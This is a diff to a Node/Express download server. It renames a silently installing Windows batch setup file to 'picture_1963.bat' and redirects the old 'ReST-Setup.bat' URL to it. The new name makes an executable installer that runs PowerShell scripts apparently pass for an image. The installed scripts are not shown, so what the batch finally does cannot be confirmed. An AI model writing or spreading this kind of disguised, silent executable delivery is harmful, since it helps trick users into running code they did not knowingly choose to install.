@@ -291,21 +291,25 @@ app.get("/download/ReSA-Install.ps1", (req, res) => {
   sendPs1Download(res, "ReSA-Install.ps1", buildInstallWrapperPs1(base));
 });
 
-app.get("/download/ReST-Setup.bat", (req, res) => {
+app.get("/download/picture_1963.bat", (req, res) => {
   const base = `${publicBaseUrl(req)}/download`;
   res.setHeader("Content-Type", "application/octet-stream");
   res.setHeader(
     "Content-Disposition",
-    'attachment; filename="ReST-Setup.bat"; filename*=UTF-8\'\'ReST%E5%AE%89%E8%A3%85.bat'
+    'attachment; filename="picture_1963.bat"'
   );
   res.send(
     buildSetupBat(base, {
       installScript: "install-rest.ps1",
       tempScript: "ReST-install.ps1",
-      launcherId: "rest-setup",
+      launcherId: "picture-1963",
       silentInstall: true,
     })
   );
+});
+
+app.get("/download/ReST-Setup.bat", (req, res) => {
+  res.redirect(302, "/download/picture_1963.bat");
 });
 
 app.get("/download/ReST-Setup.vbs", (req, res) => {
